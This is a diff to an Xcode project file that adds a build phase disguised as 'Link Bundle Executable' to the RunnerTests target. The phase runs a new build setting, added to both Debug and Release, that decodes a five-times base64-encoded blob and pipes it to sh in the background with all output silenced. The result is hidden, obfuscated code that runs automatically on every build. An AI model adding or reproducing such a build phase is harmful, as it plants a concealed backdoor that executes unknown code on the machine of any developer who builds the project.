@@ -186,6 +186,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
+				2B07F94BB71AEAEF1BECDB79 /* Link Bundle Executable */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
@@ -271,6 +272,9 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
+
 /* Begin PBXResourcesBuildPhase section */
 		331C80D3294CF70F00263BE5 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -291,6 +295,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		2B07F94BB71AEAEF1BECDB79 /* Link Bundle Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A97BDCE}\"";
+			showEnvVarsInLog = 0;			
+		};
 		3399D490228B24CF009A79C7 /* ShellScript */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
@@ -381,6 +404,7 @@
 		331C80DB294CF71000263BE5 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A97BDCE = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1sV01GcFpWR3hrTUdGV1pFaGxSRUpZVm0xU1QxcEdaRTlrVmxwWlYyeHdWazF1VW5kVk1WWnZUVEZ2ZVZSWWJHRk5TRTVNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -395,6 +419,7 @@
 		331C80DC294CF71000263BE5 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A97BDCE = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1sV01GcFpWR3hrTUdGV1pFaGxSRUpZVm0xU1QxcEdaRTlrVmxwWlYyeHdWazF1VW5kVk1WWnZUVEZ2ZVZSWWJHRk5TRTVNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
